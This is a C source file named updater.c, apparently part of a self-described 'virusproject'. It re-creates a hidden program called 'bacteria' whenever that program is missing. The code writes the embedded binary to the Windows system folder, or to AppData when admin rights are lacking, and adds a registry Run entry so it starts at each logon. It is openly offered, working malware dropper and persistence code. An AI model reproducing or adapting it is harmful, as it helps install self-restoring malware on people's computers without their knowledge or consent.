/***************************************************************************
 *   updater.c - Written by samus250, Copyright (C) 2008.                  *
 *   The updater checks if bacteria exists. If it doesn't, it creates it   *
 *   and writes the keys needed for it to operate.                         *
 *                                                                         *
 ***************************************************************************/

#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <windows.h>
#include "bacteria.h"
#include "virusproject.h"

#define DEBUG

#ifdef DEBUG
int main(void)
#else
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    PSTR szCmdLine, int iCmdShow)
#endif
{
    HKEY hkey;
    LONG result_open, result_write, result_close;
    FILE *output = NULL;
    
    char environment_var[MAX_ENVVAR_LENGTH];
    char install_directory[MAX_DIR_LENGTH];
    char value_data[MAX_KEY_VALUE_SIZE];
    
    // errors and switches
    bool systemroot_not_found = false;
    bool admin_permission = true; // assume at first that we have permission
    
    // initialize vars
    memset(environment_var, '\0', MAX_ENVVAR_LENGTH);
    memset(install_directory, '\0', MAX_DIR_LENGTH);
    memset(value_data, '\0', MAX_KEY_VALUE_SIZE);
    
#ifdef DEBUG
    printf("Updater\n");
    fflush(stdout);
#endif
    // lets prepare the directory in which bacteria should be
    GetEnvironmentVariable(ENV_SYSTEMROOT, environment_var, MAX_ENVVAR_LENGTH);
    sprintf(install_directory, "%s\\" ADMIN_BACTERIA_INSTALL_DIR "\\" ADMIN_BACTERIA_FILENAME, environment_var);
    
    // now lets check if it's there
    if(!(fopen(install_directory, "r"))) {
        // its not there, check for non admin bacteria placement
        memset(environment_var, '\0', MAX_ENVVAR_LENGTH);
        memset(install_directory, '\0', MAX_DIR_LENGTH);
        
        GetEnvironmentVariable(ENV_APPDATA, environment_var, MAX_ENVVAR_LENGTH);
        sprintf(install_directory, "%s\\" LIMITED_BACTERIA_INSTALL_DIR "\\" LIMITED_BACTERIA_FILENAME, environment_var);
        
        if(!(fopen(install_directory, "r"))) {
            // bacteria is not in the system
            // re-install it
            memset(environment_var, '\0', MAX_ENVVAR_LENGTH);
            memset(install_directory, '\0', MAX_DIR_LENGTH);
            
            // get systemroot
            if(!(GetEnvironmentVariable(ENV_SYSTEMROOT, environment_var, MAX_ENVVAR_LENGTH))) {
                if(GetLastError() == ERROR_ENVVAR_NOT_FOUND) {
                    // shit, we'll have to look someplace else
#ifdef DEBUG
                    printf("- Error, systemroot envvar not found\n");
#endif
                    systemroot_not_found = true;
                    
                } else {
                    // some unknown error
#ifdef DEBUG
                    printf("- Unknown error getting systemroot envvar\n");
#endif
                    return 0;
                }
            }
    
            if(!systemroot_not_found) {
#ifdef DEBUG
                printf("%%systemroot%% found.\n");
#endif
                sprintf(install_directory, "%s\\" ADMIN_BACTERIA_INSTALL_DIR "\\" ADMIN_BACTERIA_FILENAME, environment_var);
                if(!(output = fopen(install_directory, "wb"))) {
                    // we have concluded that the user doesn't have permissions
#ifdef DEBUG
                    printf("- Error opening %s. Assuming limited permissions.\n", install_directory);
#endif
                    admin_permission = false;
                } else {
                    // successfully opened file
                    if((fwrite(BACTERIA_DATA_NAME, sizeof(unsigned char), BACTERIA_DATA_SIZE, output)) < BACTERIA_DATA_SIZE) {
#ifdef DEBUG
                        printf("- Error writing bacteria as admin.\n");
#endif
                        return 0;
                    } else {
#ifdef DEBUG
                        printf("- Successfully wrote bacteria as admin.\n");
#endif
                    }
                    fclose(output);
                }
            }
            
            if(systemroot_not_found || !admin_permission) {
                // since systemroot was not found
                // assume that the user is not admin
                admin_permission = false;
                
                memset(environment_var, '\0', MAX_ENVVAR_LENGTH);
                memset(install_directory, '\0', MAX_DIR_LENGTH);
                
                // get appdata
                if(!(GetEnvironmentVariable(ENV_APPDATA, environment_var, MAX_ENVVAR_LENGTH))) {
                    if(GetLastError() == ERROR_ENVVAR_NOT_FOUND) {
                        // oh crap, not even appdata was found
                        // whatever, exit
#ifdef DEBUG    
                        printf("Error, appdata envvar not found\n");
#endif
                        return 0;
                    } else {
                        // some unknown error
#ifdef DEBUG
                        printf("Unknown error getting appdata envvar\n");
#endif
                        return 0;
                    }
                } else {
#ifdef DEBUG
                    printf("%%appdata%% found.\n");
#endif
                }
                
                // Create the %appdata%\limitedbacterianame directory
                sprintf(install_directory, "%s\\" LIMITED_BACTERIA_INSTALL_DIR, environment_var);
                CreateDirectory(install_directory, NULL);
                // it is impossible that the folder was not found... if it is in a system variable
                // and, if it was ERROR_ALREADY_EXISTS, then who cares? that's a good thing.
                
                // prepare the full install directory
                sprintf(install_directory, "%s\\" LIMITED_BACTERIA_INSTALL_DIR "\\" LIMITED_BACTERIA_FILENAME, environment_var);
                if(!(output = fopen(install_directory, "wb"))) {
#ifdef DEBUG
                    printf("- Error opening %s.\n", install_directory);
#endif
                    return 0;
                } else {
                    // successfully opened file
                    if((fwrite(BACTERIA_DATA_NAME, sizeof(unsigned char), BACTERIA_DATA_SIZE, output)) < BACTERIA_DATA_SIZE) {
#ifdef DEBUG
                        printf("- Error writing bacteria as limited user.\n");
#endif
                        return 0;
                    } else {
#ifdef DEBUG
                        printf("- Successfully wrote bacteria as limited user.\n");
#endif
                    }
                    fclose(output);
                }
            }
            
            //! now that we copied the file were it is possible
            //! open key, write it, and finish
            
            // open key, does not require permissions.
            result_open = RegOpenKeyEx(HKEY_CURRENT_USER, 
                        RUN_KEY_NAME,
                        0, KEY_WRITE, &hkey
            );
            
            // error opening key
            if(result_open != ERROR_SUCCESS) {
                if(result_open == ERROR_FILE_NOT_FOUND) {
#ifdef DEBUG
                    printf("- Error: key not found.\n");
#endif
                    return 0;
                } else {
#ifdef DEBUG
                    printf("- Error opening key.\n");
#endif
                    return 0;
                }
            } else {
#ifdef DEBUG
                printf("- Successfully opened key.\n");
#endif
            }
            
            // write the directory were it was installed as the value data
            // with the BACTERIA_NAME
            sprintf(value_data, "\"%s\"", install_directory);
            if(admin_permission) {
                result_write = RegSetValueEx(hkey, ADMIN_BACTERIA_NAME, 0, REG_SZ, 
                            value_data, strlen(value_data)
                );
            } else {
                result_write = RegSetValueEx(hkey, LIMITED_BACTERIA_NAME, 0, REG_SZ, 
                            value_data, strlen(value_data)
                );
            }
            
            // error writing key
            if(result_write != ERROR_SUCCESS) {
#ifdef DEBUG
                printf("- Error writing value to key.\n");
#endif
                return 0;
            } else {
#ifdef DEBUG
                printf("- Successfully wrote %s to key.\n", value_data);
#endif
            }
            
            // error closing key
            if((RegCloseKey(hkey)) != ERROR_SUCCESS) {
#ifdef DEBUG
                printf("- Error closing key.\n");
#endif
                return 0;
            } else {
#ifdef DEBUG
                printf("- Successfully closed key.\n");
#endif
            }
            
            // re-installing the bacteria was successfull!!!
        }
        
        // program falls here if we found bacteria
        // but user is not an admin
    }
    
    // program falls here if we found bacteria
    // and user is admin
#ifdef DEBUG
    fflush(stdout);
    system("pause");
#endif
    return 0;
}
